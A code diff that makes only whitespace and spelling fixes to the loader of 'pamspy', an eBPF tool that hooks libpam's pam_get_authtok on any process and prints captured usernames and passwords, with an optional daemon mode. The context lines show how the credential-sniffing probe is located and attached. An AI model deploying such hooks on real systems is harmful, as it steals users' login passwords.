@@ -135,13 +135,13 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
 /******************************************************************************/
 static bool bump_memlock_rlimit(void)
 {
-    struct rlimit rlim_new = 
+    struct rlimit rlim_new =
     {
         .rlim_cur    = RLIM_INFINITY,
         .rlim_max    = RLIM_INFINITY,
     };
 
-    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) 
+    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new))
     {
         return false;
     }
@@ -230,12 +230,12 @@ int main(int argc, char **argv)
 
     // Parse command line arguments
     err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
-    if (err) 
+    if (err)
     {
         return err;
     }
 
-    if(env.libpam_path == NULL) 
+    if (env.libpam_path == NULL)
     {
         fprintf(stderr, "pamspy: argument PATH is mandatory\n");
         exit(1);
@@ -243,29 +243,28 @@ int main(int argc, char **argv)
 
     int offset = pamspy_find_symbol_address(env.libpam_path, "pam_get_authtok");
 
-    if (offset == -1) 
+    if (offset == -1)
     {
         fprintf(stderr, "pamspy: Unable to find pam_get_authtok function in %s\n", env.libpam_path);
         exit(1);
     }
 
-    // check deamon mode
+    // check daemon mode
     if (env.output_path != NULL)
     {
         start_daemon();
     }
 
-    if(env.verbose)
+    if (env.verbose)
         libbpf_set_print(libbpf_print_fn);
 
-
-    if(!bump_memlock_rlimit())
+    if (!bump_memlock_rlimit())
     {
         fprintf(stderr, "pamspy: Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
         exit(1);
     }
- 
-    // Open BPF application 
+
+    // Open BPF application
     skel = pamspy_bpf__open();
     if (!skel) {
         fprintf(stderr, "pamspy: Failed to open BPF program: %s\n", strerror(errno));
@@ -278,14 +277,14 @@ int main(int argc, char **argv)
         fprintf(stderr, "pamspy: Failed to load BPF program: %s\n", strerror(errno));
         goto cleanup;
     }
-    
-    // Attach userland probe 
+
+    // Attach userland probe
     skel->links.trace_pam_get_authtok = bpf_program__attach_uprobe(
         skel->progs.trace_pam_get_authtok,
-		true,           /* uretprobe */
-		-1,             /* any pid */
-		env.libpam_path,       /* path to the lib*/
-		offset
+        true,           /* uretprobe */
+        -1,             /* any pid */
+        env.libpam_path,       /* path to the lib*/
+        offset
     );
 
     // Set up ring buffer
@@ -296,7 +295,7 @@ int main(int argc, char **argv)
         goto cleanup;
     }
 
-    if(env.print_headers)
+    if (env.print_headers)
     {
         fprintf(stdout, header);
         fprintf(stdout, "%-6s | %-15s | %-20s | %s\n", "PID", "PROCESS", "USERNAME", "PASSWORD");
